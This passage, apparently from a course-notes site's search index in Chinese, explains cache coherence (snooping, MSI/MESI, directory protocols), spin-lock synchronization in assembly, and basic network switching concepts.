\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u540c\u4e00\u5757\u5185\u5b58\uff0c\u53ef\u80fd\u6709\u4e0d\u540c\u7684\u5904\u7406\u5668\u5728\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\u3002\u5982\u679c\u6bcf\u4e2a\u5904\u7406\u5668\u90fd\u6709\u81ea\u5df1\u7684\u7f13\u5b58\uff0c\u5f53\u4e00\u4e2a\u5904\u7406\u5668\u4fee\u6539\u4e86\u5185\u5b58\u4e2d\u7684\u6570\u636e\uff0c\u5176\u5b83\u5904\u7406\u5668\u7684\u7f13\u5b58\u4e2d\u53ef\u80fd\u4ecd\u7136\u4fdd\u6301\u7740\u65e7\u6570\u636e\u3002\u6211\u4eec\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u80fd\u591f\u201c\u901a\u77e5\u201d\u5176\u5b83\u5904\u7406\u5668\u8fd9\u4e00\u4fee\u6539\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u79cd\u7b56\u7565\uff1a</p> <ul> <li>\u76d1\u542c\u7b56\u7565 snooping\uff0c\u9002\u7528\u4e8e SMP</li> <li>\u76ee\u5f55\u7b56\u7565 directory-based\uff0c\u9002\u7528\u4e8e DSP\uff0c\u4f46\u4e5f\u53ef\u4ee5\u7528\u5728\u7ec4\u7ec7\u6210 Bank \u7684 SMP \u4e2d</li> </ul> <p>Snooping \u534f\u8bae</p> <p>Snooping \u534f\u8bae\u5141\u8bb8\u5904\u7406\u5668\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002\u5f53 P1 \u5199\u5165 X\uff0c\u9700\u8981\u901a\u77e5\u5176\u5b83\u5904\u7406\u5668\uff0c\u5176\u5b83\u5904\u7406\u5668\u76d1\u542c\u5230\u8fd9\u4e00\u901a\u77e5\u65f6\uff0c\u5982\u679c\u81ea\u5df1\u7684 Cache \u4e2d\u4e5f\u6709 X \u7684\u526f\u672c\uff0c\u53ef\u9009\u4ee5\u4e0b\u4e24\u79cd\u4e0d\u540c\u7684\u7b56\u7565\u8fdb\u884c\u5904\u7406\uff1a</p> <ul> <li>Write Invalidate: \u5c06 X \u7684\u526f\u672c\u8bbe\u7f6e\u4e3a\u65e0\u6548<ul> <li>\u5373\u8bbe\u7f6e\u7f13\u5b58\u5757\u7684 Valid \u4f4d\u4e3a 0</li> </ul> </li> <li>Write Broadcast: \u66f4\u65b0 X \u7684\u526f\u672c</li> </ul> <p>\u901a\u8fc7 BUS \u5b9e\u73b0</p> <p>\u5373\u6bcf\u5757\u7f13\u5b58\u90fd\u80fd\u63a5\u6536\u6765\u81ea\u81ea\u5df1\u7684 Processor \u7684\u4fe1\u53f7\u4ee5\u53ca\u6765\u81ea BUS \u7684\u4fe1\u53f7\u3002</p> <p>\u5728 Simple Write-Invalidate Protocol(MSI Protocol) \u4e2d\uff0c\u6bcf\u4e2a\u7f13\u5b58\u5757\u8bbe\u7f6e\u4e86\u4e09\u79cd\u72b6\u6001\uff1a</p> <ul> <li>Invalid: \u65e0\u6548\u72b6\u6001<ul> <li>\u5373 Valid \u4f4d\u4e3a 0</li> </ul> </li> <li>Shared: \u5171\u4eab\u72b6\u6001<ul> <li>Valid = 1, Dirty = 0</li> </ul> </li> <li>Modified(Exlusive): \u72ec\u5360\u72b6\u6001<ul> <li>Valid = 1, Dirty = 1</li> </ul> </li> </ul> From CPUFrom Bus <p></p> <p></p> <p>Note</p> <ul> <li>Cache \u672c\u8eab\u91c7\u53d6 Write-Back \u7b56\u7565\uff0c\u5bf9\u4e8e\u81ea\u8eab CPU \u7684\u8bf7\u6c42\uff0c\u53ea\u8981\u6ca1\u6709\u5199\u8bf7\u6c42\u5219\u4e00\u76f4\u5904\u4e8e Shared \u72b6\u6001\uff08\u548c\u5176\u5b83\u5904\u7406\u5668\u5171\u4eab\u76f8\u540c\u6570\u636e\uff09\uff0c\u5982\u679c\u8981\u5199\u7f13\u5b58\uff0c\u5219\u8fdb\u5165\u72ec\u5360\u72b6\u6001\uff0c\u6b64\u65f6\u5982\u679c\u522b\u7684\u5904\u7406\u5668\u60f3\u8981\u8bfb\u6216\u5199\u8be5\u5185\u5b58\uff0c\u90fd\u9700\u8981\u5c06\u5176\u5199\u56de</li> <li>Cache \u672c\u6765\u5728\u72ec\u5360\u72b6\u6001\uff0c\u5982\u679c\u63a5\u6536\u5230 Bus \u7684 Write Miss \u8bf7\u6c42(\u5176\u5b83\u5904\u7406\u5668\u5c1d\u8bd5\u5199\u5165\u540c\u4e00\u5185\u5b58)\uff0c\u5219\u5c06\u810f\u5757\u5199\u56de\u4e14\u8fdb\u5165 Invalid \u72b6\u6001\uff08\u56e0\u4e3a\u91c7\u7528 Write-Invalidate Protocol\uff09</li> </ul> <p></p> <p>\u8003\u8bd5\u5e38\u8003\u7684\u5219\u662f\u5176\u62d3\u5c55\u534f\u8bae MESI Protocol\uff0c\u5176\u589e\u52a0\u4e00\u4e2a\u72b6\u6001 Exclusive\uff1a</p> <ul> <li>Invalid: \u65e0\u6548\u72b6\u6001<ul> <li>Valid = 0</li> </ul> </li> <li>Shared: \u5171\u4eab\u72b6\u6001<ul> <li>Valid = 1, Dirty = 0\uff0c\u4e14\u8be5\u7f13\u5b58\u884c\u88ab\u5927\u4e8e\u7b49\u4e8e 2 \u4e2a\u5904\u7406\u5668\u7f13\u5b58</li> <li>\u5171\u4eab\u72b6\u6001\u4e0b\u5904\u7406\u5668\u60f3\u8981\u5199\u8be5\u7f13\u5b58\u884c\uff0c\u5219\u5176\u5b83\u7f13\u5b58\u526f\u672c\u5fc5\u987b\u8fdb\u5165 Invalid \u72b6\u6001</li> </ul> </li> <li>Exclusive: \u72ec\u5360\u72b6\u6001<ul> <li>Valid = 1, Dirty = 0\uff0c\u4e14\u8be5\u7f13\u5b58\u884c\u53ea\u88ab\u8be5\u5904\u7406\u5668\u7f13\u5b58</li> <li>\u72ec\u5360\u72b6\u6001\u4e0b\u5904\u7406\u5668\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5\u7f13\u5b58\u884c\u800c\u4e0d\u9700\u8981\u901a\u77e5\u5176\u5b83\u5904\u7406\u5668</li> </ul> </li> <li>Modified: \u4fee\u6539\u72b6\u6001<ul> <li>Valid = 1, Dirty = 1</li> </ul> </li> </ul> <p></p> <p>Coherent Miss \u4e2d\uff0c\u6839\u636e\u662f\u5426\u6e90\u4e8e\u5904\u7406\u5668\u4e4b\u95f4\u7684\u6570\u636e\u5171\u4eab\u800c\u5212\u5206\u4e3a\u4e24\u79cd\uff1a</p> <ul> <li>True Sharing Miss \u4e0d\u540c\u5904\u7406\u5668\u5bf9\u540c\u4e00\u4e2a Cache Block \u7684\u540c\u4e00\u4e2a\u53d8\u91cf\u8bbf\u95ee\u9020\u6210\u7684 miss<ul> <li>Case 1\uff1a\u5bf9\u4e00\u4e2a Shared Cache Block \u8fdb\u884c\u521d\u6b21\u5199\u64cd\u4f5c\uff0c\u6b64\u65f6\u5176\u5b83\u7f13\u5b58\u4e2d\u8be5\u5757\u88ab Invalidate\uff0c\u7b97\u4f5c\u4e00\u6b21 coherence miss</li> <li>Case 2\uff1a\u5c1d\u8bd5\u8bfb\u53d6\u53e6\u4e00\u4e2a\u5904\u7406\u5668\u7684 Modified Word\uff0c\u7531\u4e8e\u8be5\u5904\u7406\u5668\u672c\u8eab Cache \u4e2d\u8be5\u5757\u80af\u5b9a\u662f Invalid \u7684\uff0c\u56e0\u6b64\u4e5f\u662f coherence miss </li> </ul> </li> <li>False Sharing Miss \u6ca1\u6709\u5171\u4eab\u6570\u636e\uff0c\u4f46\u88ab\u7f13\u5b58\u534f\u8bae\u8bef\u5224\u4e3a\u5171\u4eab<ul> <li>\u4e0d\u540c\u5904\u7406\u5668\u8bbf\u95ee\u4e86\u540c\u4e00\u4e2a Cache Block \u4e2d\u7684\u4e0d\u540c\u53d8\u91cf\uff0c\u4f46\u662f\u8fd9\u4e9b\u53d8\u91cf\u5171\u4eab\u4e86\u7f13\u5b58\u5757\uff0c\u5bfc\u81f4\u5199\u5165\u4e00\u4e2a\u53d8\u91cf\u4f7f\u5f97\u6574\u4e2a Block \u88ab Invalidate\uff0c\u4ece\u800c\u5e72\u6270\u5176\u5b83\u5904\u7406\u5668\u8bbf\u95ee\u5176\u5b83\u53d8\u91cf\uff0c\u9020\u6210 miss</li> </ul> </li> </ul> <p>\u76ee\u5f55\u534f\u8bae</p> <p></p> <p>\u6bcf\u4e2a\u5904\u7406\u5668\u90fd\u6709\u81ea\u5df1\u7684 Cache\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u4e00\u81f4\u6027\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u5206\u5e03\u5f0f\u76ee\u5f55\u7ed3\u6784 Directory \u8bb0\u5f55\u6bcf\u4e2a\u5185\u5b58\u5757\u5f53\u524d\u7684\u7f13\u5b58\u72b6\u6001\u4ee5\u53ca\u88ab\u54ea\u4e9b\u5904\u7406\u5668\u7f13\u5b58\u4e86\u3002</p> <p>\u56e0\u6b64\u4e0d\u9700\u8981\u50cf Snooping \u534f\u8bae\u4e00\u6837\u5e7f\u64ad\u6570\u636e\u53d8\u66f4\uff0c\u4ece\u800c\u8282\u7701\u5e26\u5bbd\uff0c\u66f4\u9002\u5408\u5927\u89c4\u6a21\u7cfb\u7edf</p> <p>\u4e0d\u662f\u5e7f\u64ad\uff0c\u800c\u662f\u76ee\u5f55\u4e0e\u8bf7\u6c42\u8282\u70b9\u3001\u4e0e\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u8282\u70b9\u4e4b\u95f4\u9009\u62e9\u6027\u5730\u8fdb\u884c\u901a\u4fe1\u3002</p> <p>\u4e3a\u6bcf\u4e00\u5757\u5185\u5b58\u8bb0\u5f55 directory\uff0c\u76ee\u5f55\u7684\u5185\u5bb9\u4e3a\uff1a</p> <ul> <li>\u8be5\u5757\u7684\u72b6\u6001<ul> <li>Shared\uff1a\u6709\u8282\u70b9\u7f13\u5b58\u4e86\u8be5\u5757\uff0c\u4e14\u503c\u4e3a\u6700\u65b0</li> <li>Uncached\uff1a\u6ca1\u6709\u8282\u70b9\u62e5\u6709\u8be5\u5757\u7684 Copy</li> <li>Modified(Exclusive)\uff1a\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u8282\u70b9\u62e5\u6709\u8be5\u5757\u7684 Copy\uff0c\u4e14\u5df2\u88ab Write</li> </ul> </li> <li>\u54ea\u4e9b\u5904\u7406\u5668\u6709\u8fd9\u4e2a\u5757\u7684\u526f\u672c<ul> <li>\u7528 bit vector \u8868\u793a</li> </ul> </li> <li>Dirty/Clean</li> </ul> <p>\u6ce8\u610f Directory \u662f\u5bf9\u5185\u5b58\u800c\u4e0d\u662f\u5bf9\u7f13\u5b58\u7684\u54e6</p> <p></p> <p>\u5bf9\u4e00\u5757\u5185\u5b58\u64cd\u4f5c\uff0c\u6d89\u53ca\u4e09\u4e2a\u5904\u7406\u5668\u7684\u6982\u5ff5\uff1a</p> <ul> <li>Local Node: \u53d1\u8d77\u8bf7\u6c42\u7684\u5904\u7406\u5668</li> <li>Home Node: \u5bf9\u5e94\u5185\u5b58\u5730\u5740\u6240\u5728\u7684\u5904\u7406\u5668<ul> <li>Home Node \u8d1f\u8d23\u7ef4\u62a4\u8be5\u5185\u5b58\u5730\u5740\u5bf9\u5e94\u7684\u6570\u636e\u9879\u7684\u72b6\u6001\uff0c\u4f8b\u5982 <code>X:S, {P1,P2}</code> \u8868\u793a\u6570\u636e\u9879 X \u4e3a Shared \u72b6\u6001\uff0cRemote Node \u4e3a P1, P2</li> </ul> </li> <li>Remote Node: \u62e5\u6709\u8fd9\u4e2a\u526f\u672c\u7684\u5904\u7406\u5668</li> </ul> From CPUFrom Cache <p></p> <p></p> <p>Note</p> <ul> <li>\u67d0 Cache \u72ec\u5360\u4e00\u4e2a\u5730\u5740\u5757\uff0c\u4f46\u662f\u5f53\u8fd9\u4e2a\u5757\u56e0\u4e3a Cache \u7a7a\u95f4\u4e0d\u591f\u6216\u8005\u5176\u5b83\u539f\u56e0\u88ab victim\uff0c\u9700\u8981 Write-Back \u65f6\uff0c\u4f1a\u5411\u8be5\u5757\u6240\u5bf9\u5e94\u7684\u76ee\u5f55\u4f4d\u7f6e\u53d1\u9001\u201c\u6570\u636e\u5199\u56de\u201d\u6d88\u606f\uff0c\u5e76\u8f6c\u4e3a Uncached \u72b6\u6001</li> </ul>"},{"location":"Courses/CA/TLP/#synchronization","title":"Synchronization","text":"<p>\u6ca1\u6709\u5566</p> <p>\u5bf9\u4e8e\u5927\u578b\u591a\u5904\u7406\u5668\u7cfb\u7edf\uff0c\u540c\u6b65\u53ef\u80fd\u662f\u6027\u80fd\u7684\u74f6\u9888</p> <ul> <li>Hardware Primitive: \u63d0\u4f9b\u4e00\u4e2a\u53ef\u4ee5\u539f\u5b50\u6027\u5730\u83b7\u53d6\u5e76\u66f4\u6539\u5185\u5b58\u503c\u7684 Instruction Sequences<ul> <li>\u5728 User Level Synchronization \u4e0a\u4f7f\u7528</li> </ul> </li> <li>Spin Lock: \u5904\u7406\u5668\u4f7f\u7528\u4e00\u4e2a\u5faa\u73af\u6301\u7eed\u5c1d\u8bd5\u83b7\u53d6\u9501</li> </ul> <pre><code># atomic exchange\n        DADDUI R2, R0, 1   # locked value\nlockit: EXCH   R2, 0(R1)   # exchange\n        BNEZ   R2, lockit  # if success, R2 = 0\n\n# test-and-set\nlockit: T&amp;S   R2, 0(R1)\n        BNEZ  R2, lockit\n\n# spin lock using LL &amp; SC\nlockit: LL    x2, 0(x1)     # load linked\n        BNEZ  x2, lockit    # no free =&gt; spin\n        ADDUI x2, x0, 1     # locked value\n        SC    x2, 0(x1)     # atomic exchange\n        BNQZ  x2, lockit    # already lock?\n</code></pre> <p>\u5982\u679c\u5df2\u7ecf\u5b9e\u73b0\u4e86\u7f13\u5b58\u4e00\u81f4\u6027\uff0c\u5219 Lock Value \u53ef\u80fd\u4f1a\u5728 Cache \u4e2d\uff1b\u5426\u5219\u5b83\u4e00\u5b9a\u5b58\u50a8\u5728 Memory \u4e2d\u3002</p> <p><code>ll</code> \u548c <code>sc</code> \u4e4b\u95f4\u53ea\u80fd\u7531 Register-Register Instruction\uff0c\u4e0d\u80fd\u6709\u8bbf\u5b58\u6307\u4ee4</p> <p>\u4e0e <code>EXCH</code> \u7b49\u76f8\u6bd4\uff0c\u5b83\u4eec\u5c06\u8bfb\u53d6\u548c\u5199\u5165\u72ec\u7acb\uff0c\u89e3\u51b3\u4e86\u4e0d\u6070\u5f53\u7ade\u4e89\uff0c\u4f8b\u5982\u5bf9 unavailable lock \u8fdb\u884c\u4e0d\u5fc5\u8981\u7684 write \u8bf7\u6c42\u3002</p> <p></p>"},{"location":"Courses/CN/","title":"\u8ba1\u7b97\u673a\u7f51\u7edc","text":""},{"location":"Courses/CN/#_1","title":"\u8ba1\u7b97\u673a\u7f51\u7edc","text":"<p> \u7ea6 11 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Courses/CN/#reference","title":"Reference","text":"<ul> <li>\u8ba1\u7b97\u673a\u7f51\u7edc</li> </ul>"},{"location":"Courses/CN/Topic0/","title":"\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784","text":""},{"location":"Courses/CN/Topic0/#_1","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u4f53\u7cfb\u7ed3\u6784","text":"<p> \u7ea6 2667 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p>"},{"location":"Courses/CN/Topic0/#concept","title":"Concept","text":"<p>\u4e00\u822c\u8ba4\u4e3a\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u662f\u4e00\u4e2a\u5c06\u4f17\u591a\u5206\u6563\u3001\u81ea\u6cbb\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u901a\u8fc7\u901a\u4fe1\u8bbe\u5907\u4e0e\u7ebf\u8def\u8fde\u63a5\u8d77\u6765\uff0c\u7531\u529f\u80fd\u5b8c\u5584\u7684\u8f6f\u4ef6\u5b9e\u73b0\u8d44\u6e90\u5171\u4eab\u548c\u4fe1\u606f\u4f20\u9012\u7684\u7cfb\u7edf\u3002\u7f51\u7edc\u7531\u82e5\u5e72\u8282\u70b9\uff08Node\uff09\u548c\u8fde\u63a5\u8fd9\u4e9b\u8282\u70b9\u7684\u94fe\u8def\uff08Link\uff09\u7ec4\u6210\u3002\u7f51\u7edc\u4e4b\u95f4\u8fd8\u53ef\u4ee5\u901a\u8fc7\u8def\u7531\u5668\u4e92\u8fde\uff0c\u5f62\u6210\u4e92\u8fde\u7f51\uff08internet\uff09</p> <ul> <li>\u4e92\u8fde\u7f51\uff0cinternet \u6cdb\u6307\u7531\u591a\u4e2a\u8ba1\u7b97\u673a\u7f51\u7edc\u4e92\u8fde\u800c\u6210\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\uff0c\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u7684\u901a\u4fe1\u534f\u8bae</li> <li>\u4e92\u8054\u7f51\uff0cInternet \u4e13\u6307\u5f53\u524d\u6700\u5927\u7684\u3001\u5f00\u653e\u7684\u3001\u7531\u4f17\u591a\u7f51\u7edc\u548c\u8def\u7531\u5668\u4e92\u8fde\u800c\u6210\u7684\u7279\u5b9a\u8ba1\u7b97\u673a\u7f51\u7edc\uff0c\u5b83\u4f7f\u7528 TCP/IP \u65cf\u4f5c\u4e3a\u901a\u4fe1\u89c4\u5219</li> </ul> <p>\u7f51\u7edc\u4e2d\u7684 Node \u53ef\u4ee5\u662f\u8ba1\u7b97\u673a\u3001\u96c6\u7ebf\u5668\u3001\u4ea4\u6362\u673a\u6216\u8def\u7531\u5668\u7b49</p> <p>\u4ece\u5de5\u4f5c\u65b9\u5f0f\u4e0a\u770b\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u53ef\u5206\u4e3a\u8fb9\u7f18\u90e8\u5206\u548c\u6838\u5fc3\u90e8\u5206\uff1a</p> <ul> <li>\u8fb9\u7f18\u90e8\u5206 \u7531\u6240\u6709\u8fde\u63a5\u5728\u56e0\u7279\u7f51\u4e0a\u7684\u4e3b\u673a\u7ec4\u6210\u3002\u8fd9\u90e8\u5206\u662f\u7528\u6237\u76f4\u63a5\u4f7f\u7528\u7684\uff0c\u7528\u6765\u8fdb\u884c\u901a\u4fe1\uff08\u4f20\u9001\u6570\u636e\u3001\u97f3\u9891\u6216\u89c6\u9891\uff09\u548c\u8d44\u6e90\u5171\u4eab\u3002</li> <li>\u6838\u5fc3\u90e8\u5206 \u7531\u5927\u91cf\u7f51\u7edc\u548c\u8fde\u63a5\u8fd9\u4e9b\u7f51\u7edc\u7684\u8def\u7531\u5668\u7ec4\u6210\u3002\u8fd9\u90e8\u5206\u662f\u4e3a\u8fb9\u7f18\u90e8\u5206\u63d0\u4f9b\u670d\u52a1\u7684\uff08\u63d0\u4f9b\u8fde\u901a\u6027\u548c\u4ea4\u6362\uff09\u3002</li> </ul> <p>\u6240\u8c13\u8ba1\u7b97\u673a\u4e4b\u95f4\u901a\u4fe1\uff0c\u4e00\u822c\u6307\u8fb9\u7f18\u90e8\u5206\u4e0a\u4e3b\u673a A \u7684\u67d0\u4e2a\u8fdb\u7a0b\u4e0e\u4e3b\u673a B \u7684\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u8fdb\u884c\u901a\u4fe1\u3002\u7aef\u7cfb\u7edf\u4e2d\u8fd0\u884c\u7684\u7a0b\u5e8f\u4e4b\u95f4\u7684\u901a\u4fe1\u65b9\u5f0f\u901a\u5e38\u53ef\u5206\u4e3a C/S \u548c P2P \u4e24\u79cd\u3002</p> <p>\u8def\u7531\u5668\uff08Router\uff09\u5728\u7f51\u7edc\u6838\u5fc3\u90e8\u5206\u8d77\u5230\u91cd\u8981\u4f5c\u7528\uff0c\u5b83\u5bf9\u6536\u5230\u7684\u5206\u7ec4\u8fdb\u884c\u5b58\u50a8\u8f6c\u53d1\u6765\u5b9e\u73b0\u5206\u7ec4\u4ea4\u6362\u3002\u4e3a\u4e86\u4e86\u89e3\u5206\u7ec4\u4ea4\u6362\u7684\u539f\u7406\uff0c\u6211\u4eec\u9996\u5148\u5b66\u4e60\u7535\u8def\u4ea4\u6362\u548c\u62a5\u6587\u4ea4\u6362\u4e24\u4e2a\u6982\u5ff5\u3002</p> <p>\u7535\u8def\u4ea4\u6362</p> <p>\u4f20\u7edf\u7535\u8bdd\u7f51\u662f\u6700\u5178\u578b\u7684\u7535\u8def\u4ea4\u6362\u7f51\uff0c\u5176\u7279\u70b9\u662f\u5728\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u524d\uff0c\u4e24\u4e2a\u7528\u6237\u5fc5\u987b\u5148\u5efa\u7acb\u4e00\u6761\u4e13\u7528\u7684\u7269\u7406\u901a\u4fe1\u8def\u5f84\uff0c\u5e76\u4e14\u5728\u6570\u636e\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u59cb\u7ec8\u72ec\u5360\u8fd9\u6761\u7ebf\u8def\uff0c\u76f4\u5230\u901a\u4fe1\u7ed3\u675f\u3002</p> <p>\u4ece\u901a\u4fe1\u8d44\u6e90\u5206\u914d\u89d2\u5ea6\u6765\u770b\uff0c\u300c\u4ea4\u6362\u300d\uff08switching\uff09\u5c31\u662f\u6309\u7167\u67d0\u79cd\u65b9\u5f0f\u52a8\u6001\u5730\u5206\u914d\u4f20\u8f93\u7ebf\u8def\u7684\u8d44\u6e90\u3002\u5728\u7535\u8def\u4ea4\u6362\u4e2d\uff0c\u5b83\u7684\u542b\u4e49\u662f\u628a\u4e00\u6761\u7535\u8bdd\u7ebf\u8f6c\u63a5\u5230\u53e6\u4e00\u6761\u7535\u8bdd\u7ebf\u4e0a\uff0c\u4f7f\u5176\u8fde\u901a\u3002</p> <p></p> <p>\u5728\u901a\u4fe1\u8def\u5f84\u5efa\u7acb\u540e\uff0c\u4e24\u4e2a\u8282\u70b9\u4e4b\u95f4\u7684\u901a\u4fe1\u4e0d\u5b58\u5728\u5b58\u50a8\u8f6c\u53d1\u8017\u8d39\u65f6\u95f4\uff0c\u6bd4\u7279\u6d41\u5c31\u597d\u50cf\u5728\u4e00\u4e2a\u7ba1\u9053\u4e2d\u4f20\u9001\u3002\u56e0\u6b64\uff0c\u7535\u8def\u4ea4\u6362\u7684\u4f18\u7f3a\u70b9\u5982\u4e0b\uff1a</p> <p>\u3010\u4f18\u70b9\u3011</p> <ol> <li>\u901a\u4fe1\u65f6\u5ef6\u5c0f</li> <li>\u6709\u5e8f\u4f20\u8f93</li> <li>\u6ca1\u6709\u51b2\u7a81\uff0c\u4e0d\u4f1a\u4e89\u7528\u7269\u7406\u4fe1\u9053</li> <li>\u5b9e\u65f6\u6027\u5f3a</li> </ol> <p>\u3010\u7f3a\u70b9\u3011</p> <ol> <li>\u5efa\u7acb\u8fde\u63a5\u65f6\u95f4\u957f</li> <li>\u7ebf\u8def\u5229\u7528\u7387\u4f4e</li> <li>\u7075\u6d3b\u6027\u5dee\uff0c\u7269\u7406\u901a\u8def\u4e2d\u4efb\u610f\u4e00\u70b9\u51fa\u73b0\u6545\u969c\uff0c\u5c31\u5fc5\u987b\u91cd\u65b0\u62e8\u53f7\u5efa\u7acb\u65b0\u7684\u8fde\u63a5</li> <li>\u96be\u4ee5\u5b9e\u73b0\u5dee\u9519\u63a7\u5236\uff0c\u56e0\u4e3a\u4e2d\u95f4\u8282\u70b9\u4e0d\u5177\u5907\u5b58\u50a8\u548c\u68c0\u9a8c\u6570\u636e\u7684\u80fd\u529b</li> </ol> <p>\u8ba1\u7b97\u673a\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u9001\u5f80\u5f80\u662f\u7a81\u53d1\u5f0f\uff08\u9ad8\u9891\u3001\u5c11\u91cf\uff09\uff0c\u56e0\u6b64\u7535\u8def\u4ea4\u6362\u7684\u7ebf\u8def\u8d44\u6e90\u5229\u7528\u7387\u96be\u4ee5\u63a5\u53d7</p> <p>\u62a5\u6587\u4ea4\u6362</p> <p>\u62a5\u6587\uff08Message\uff09\u7531\u7528\u6237\u6570\u636e\u52a0\u4e0a\u4e00\u4e9b\u989d\u5916\u4fe1\u606f\u5c01\u88c5\u800c\u6210\uff0c\u662f\u6570\u636e\u4ea4\u6362\u7684\u5355\u4f4d\u3002</p> <p>\u62a5\u6587\u4ea4\u6362\u5df2\u7ecf\u5f15\u5165\u4e86\u5b58\u50a8\u8f6c\u53d1\u6280\u672f\uff0c\u76f8\u90bb\u7684\u8282\u70b9\u63a5\u6536\u5230\u62a5\u6587\u540e\u4f1a\u5c06\u5176\u5b58\u50a8\uff0c\u5e76\u67e5\u627e\u81ea\u5df1\u7684\u8f6c\u53d1\u8868\u4ee5\u786e\u5b9a\u4e0b\u4e00\u4e2a\u8f6c\u53d1\u7684\u8282\u70b9\u3002</p> <p>\u76f8\u6bd4\u7535\u8def\u4ea4\u6362\uff0c\u62a5\u6587\u4ea4\u6362\u6709\u5982\u4e0b\u4f18\u7f3a\u70b9\uff1a</p> <p>\u3010\u4f18\u70b9\u3011</p> <ol> <li>\u65e0\u5efa\u7acb\u8fde\u63a5\u65f6\u5ef6</li> <li>\u7ebf\u8def\u5206\u914d\u7075\u6d3b</li> <li>\u7ebf\u8def\u5229\u7528\u7387\u9ad8</li> <li>\u652f\u6301\u5dee\u9519\u63a7\u5236</li> </ol> <p>\u3010\u7f3a\u70b9\u3011</p> <ol> <li>\u8f6c\u53d1\u65f6\u5ef6\u9ad8</li> <li>\u7f13\u5b58\u5f00\u9500\u5927</li> <li>\u9519\u8bef\u5904\u7406\u4f4e\u6548\uff0c\u5982\u679c\u62a5\u6587\u8f83\u957f\uff0c\u53d1\u751f\u4f20\u8f93\u9519\u8bef\u7684\u6982\u7387\u76f8\u5bf9\u66f4\u5927\uff0c\u91cd\u4f20\u6574\u4e2a\u62a5\u6587\u7684\u4ee3\u4ef7\u4e5f\u66f4\u5927</li> </ol> <p>\u5206\u7ec4\u4ea4\u6362</p> <p>\u4e3a\u4e86\u89e3\u51b3\u62a5\u6587\u4ea4\u6362\u4e2d\u7684\u62a5\u6587\u8fc7\u957f\u95ee\u9898\uff0c\u6e90\u4e3b\u673a\u5728\u53d1\u9001\u4e4b\u524d\uff0c\u4f1a\u628a\u62a5\u6587\u5212\u5206\u6210\u82e5\u5e72\u8f83\u5c0f\u7684\u7b49\u957f\u6570\u636e\u6bb5\uff0c\u5e76\u4e14\u5728\u6bcf\u4e2a\u6570\u636e\u6bb5\u524d\u9762\u6dfb\u52a0\u5fc5\u8981\u63a7\u5236\u4fe1\u606f\u7ec4\u6210\u9996\u90e8\uff0c\u6784\u6210\u5206\u7ec4\uff08Packet\uff09</p> <p>\u540c\u65f6\uff0c\u7531\u4e8e\u4f20\u8f93\u7684\u5355\u4f4d\u4ece\u6574\u4e2a\u62a5\u6587\u53d8\u4e3a\u4e86\u66f4\u5c0f\u7684\u5206\u7ec4\uff0c\u5206\u7ec4\u4ea4\u6362\u5177\u6709\u5982\u4e0b\u4f18\u7f3a\u70b9\uff1a</p> <p>\u3010\u4f18\u70b9\u3011</p> <ol> <li>\u65b9\u4fbf\u5b58\u50a8\u7ba1\u7406\uff0c\u5b58\u50a8\u8f6c\u53d1\u5f00\u9500\u5c0f\u3002\u56e0\u4e3a\u5206\u7ec4\u957f\u5ea6\u56fa\u5b9a\uff0c\u6240\u4ee5\u76f8\u5e94\u7f13\u51b2\u533a\u5927\u5c0f\u4e5f\u56fa\u5b9a</li> <li>\u4f20\u8f93\u6548\u7387\u9ad8\uff0c\u91c7\u7528\u6d41\u6c34\u7ebf\u65b9\u5f0f\u51cf\u5c11\u4e86\u62a5\u6587\u4f20\u8f93\u65f6\u95f4\uff08\u89c1\u4e0b\u56fe\uff09</li> <li>\u51cf\u5c11\u51fa\u9519\u6982\u7387\u548c\u91cd\u4f20\u4ee3\u4ef7</li> </ol> <p>\u3010\u7f3a\u70b9\u3011</p> <ol> <li>\u4ecd\u7136\u5b58\u5728\u4e00\u5b9a\u5b58\u50a8\u8f6c\u53d1\u65f6\u5ef6</li> <li>\u5206\u7ec4\u5177\u6709\u989d\u5916\u63a7\u5236\u4fe1\u606f\uff0c\u589e\u52a0\u989d\u5916\u4f20\u8f93\u91cf</li> <li>\u5982\u679c\u4f7f\u7528\u6570\u636e\u62a5\u670d\u52a1\uff0c\u53ef\u80fd\u5b58\u5728\u5206\u7ec4\u5931\u5e8f\u3001\u4e22\u5931\u6216\u91cd\u590d\u7b49\u60c5\u51b5\uff1b\u5982\u679c\u4f7f\u7528\u865a\u7535\u8def\u670d\u52a1\uff0c\u5219\u9700\u8981\u547c\u53eb\u5efa\u7acb\u3001\u6570\u636e\u4f20\u8f93\u548c\u865a\u7535\u8def\u91ca\u653e\u4e09\u4e2a\u8fc7\u7a0b</li> </ol> <p></p> 